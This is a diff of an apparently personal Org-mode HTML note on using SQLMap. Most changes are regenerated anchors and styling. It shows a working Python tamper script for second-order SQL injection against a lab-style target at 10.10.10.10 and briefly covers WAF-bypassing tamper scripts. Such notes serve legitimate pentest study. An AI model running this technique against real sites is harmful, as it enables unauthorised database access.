@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-07-13 Thu 20:32 -->
+<!-- 2023-07-14 Fri 07:43 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SQLMap</title>
@@ -29,26 +29,26 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgc00591c">SQLMap</a>
+<li><a href="#orgb70bf07">SQLMap</a>
 <ul>
-<li><a href="#orgde48916">Second Order Injection</a></li>
-<li><a href="#org639d379">Bypassing WAF</a></li>
+<li><a href="#org2fbddbb">Second Order Injection</a></li>
+<li><a href="#org96b06bd">Bypassing WAF</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgc00591c" class="outline-2">
-<h2 id="orgc00591c">SQLMap</h2>
-<div class="outline-text-2" id="text-orgc00591c">
+<div id="outline-container-orgb70bf07" class="outline-2">
+<h2 id="orgb70bf07">SQLMap</h2>
+<div class="outline-text-2" id="text-orgb70bf07">
 <p>
 Sqlmap is an advanced tool for finding and exploiting <a href="20221213185522-sql_injection.html#ID-81d62666-4ce8-4244-b498-739a680f9673">SQL Injection</a>.
 </p>
 </div>
 
-<div id="outline-container-orgde48916" class="outline-3">
-<h3 id="orgde48916">Second Order Injection</h3>
-<div class="outline-text-3" id="text-orgde48916">
+<div id="outline-container-org2fbddbb" class="outline-3">
+<h3 id="org2fbddbb">Second Order Injection</h3>
+<div class="outline-text-3" id="text-org2fbddbb">
 <p>
 For very simple use cases you might not need a tamper script
 </p>
@@ -70,39 +70,39 @@ If more is needed to be done then you need to create a tamper script.
 create a dir for the tamper name it like second for example
 </p>
 <div class="org-src-container">
-<pre class="src src-shell">mkdir second
-touch -p second/__init__.py
+<pre class="src src-shell"><span style="color: #ffd400;">mkdir</span> second
+<span style="color: #ffd400;">touch</span> -p second/__init__.py
 </pre>
 </div>
 <p>
 then write the tamper script.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">!/usr/bin/env python</span>
+<pre class="src src-python"><span style="color: #546A90;">#</span><span style="color: #546A90;">!/usr/bin/env python</span>
 
-<span style="font-weight: bold;">import</span> re
-<span style="font-weight: bold;">import</span> requests
-<span style="font-weight: bold;">from</span> lib.core.enums <span style="font-weight: bold;">import</span> PRIORITY
-<span style="font-weight: bold; font-style: italic;">__priority__</span> = PRIORITY.NORMAL
+<span style="color: #ff2afc; font-weight: bold;">import</span> re
+<span style="color: #ff2afc; font-weight: bold;">import</span> requests
+<span style="color: #ff2afc; font-weight: bold;">from</span> lib.core.enums <span style="color: #ff2afc; font-weight: bold;">import</span> PRIORITY
+<span style="color: #df85ff;">__priority__</span> = PRIORITY.NORMAL
 
-<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">dependencies</span>():
-    <span style="font-weight: bold;">pass</span>
+<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">dependencies</span>():
+    <span style="color: #ff2afc; font-weight: bold;">pass</span>
 
-<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">login_account</span>(payload):
-    <span style="font-weight: bold; font-style: italic;">proxies</span> = {<span style="font-style: italic;">'http'</span>:<span style="font-style: italic;">'http://127.0.0.1:8080'</span>}
-    <span style="font-weight: bold; font-style: italic;">cookies</span> = {<span style="font-style: italic;">"PHPSESSID"</span>: <span style="font-style: italic;">"6laafab1f6om5rqjsbvhmq9mf2"</span>}
+<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">login_account</span>(payload):
+    <span style="color: #df85ff;">proxies</span> = {<span style="color: #7984D1;">'http'</span>:<span style="color: #7984D1;">'http://127.0.0.1:8080'</span>}
+    <span style="color: #df85ff;">cookies</span> = {<span style="color: #7984D1;">"PHPSESSID"</span>: <span style="color: #7984D1;">"6laafab1f6om5rqjsbvhmq9mf2"</span>}
 
-    <span style="font-weight: bold; font-style: italic;">params</span> = {<span style="font-style: italic;">"username"</span>:<span style="font-style: italic;">"asdasdasd"</span>, <span style="font-style: italic;">"email"</span>:payload, <span style="font-style: italic;">"password"</span>:<span style="font-style: italic;">"11111111"</span>}
-    <span style="font-weight: bold; font-style: italic;">url</span> = <span style="font-style: italic;">"http://10.10.10.10/create.php"</span>
-    <span style="font-weight: bold; font-style: italic;">pr</span> = requests.post(url, data=params, cookies=cookies, verify=<span style="font-weight: bold; text-decoration: underline;">False</span>, allow_redirects=<span style="font-weight: bold; text-decoration: underline;">True</span>, proxies=proxies)
+    <span style="color: #df85ff;">params</span> = {<span style="color: #7984D1;">"username"</span>:<span style="color: #7984D1;">"asdasdasd"</span>, <span style="color: #7984D1;">"email"</span>:payload, <span style="color: #7984D1;">"password"</span>:<span style="color: #7984D1;">"11111111"</span>}
+    <span style="color: #df85ff;">url</span> = <span style="color: #7984D1;">"http://10.10.10.10/create.php"</span>
+    <span style="color: #df85ff;">pr</span> = requests.post(url, data=params, cookies=cookies, verify=<span style="color: #df85ff; font-weight: bold;">False</span>, allow_redirects=<span style="color: #df85ff; font-weight: bold;">True</span>, proxies=proxies)
 
-    url = <span style="font-style: italic;">"http://10.10.10.10/exit.php"</span>
-    pr = requests.get(url, cookies=cookies, verify=<span style="font-weight: bold; text-decoration: underline;">False</span>, allow_redirects=<span style="font-weight: bold; text-decoration: underline;">True</span>, proxies=proxies)
+    url = <span style="color: #7984D1;">"http://10.10.10.10/exit.php"</span>
+    pr = requests.get(url, cookies=cookies, verify=<span style="color: #df85ff; font-weight: bold;">False</span>, allow_redirects=<span style="color: #df85ff; font-weight: bold;">True</span>, proxies=proxies)
 
-<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">tamper</span>(payload, **kwargs):
-    headers = kwargs.get(<span style="font-style: italic;">"headers"</span>, {})
+<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">tamper</span>(payload, **kwargs):
+    headers = kwargs.get(<span style="color: #7984D1;">"headers"</span>, {})
     login_account(payload)
-    <span style="font-weight: bold;">return</span> payload
+    <span style="color: #ff2afc; font-weight: bold;">return</span> payload
 </pre>
 </div>
 <p>
@@ -111,9 +111,9 @@ By using tampers you should be able to set sqlmap up for most tasks. They are ex
 </div>
 </div>
 
-<div id="outline-container-org639d379" class="outline-3">
-<h3 id="org639d379">Bypassing WAF</h3>
-<div class="outline-text-3" id="text-org639d379">
+<div id="outline-container-org96b06bd" class="outline-3">
+<h3 id="org96b06bd">Bypassing WAF</h3>
+<div class="outline-text-3" id="text-org96b06bd">
 <p>
 Checkout the different tamper scripts that can modify the requests.
 </p>
@@ -138,7 +138,7 @@ Checkout the different tamper scripts that can modify the requests.
 <div id="postamble" class="status">
 <p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
 <p class="date">Date: </p>
-<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.6.1)</p>
 <p class="validation"></p>
 </div>
 </body>
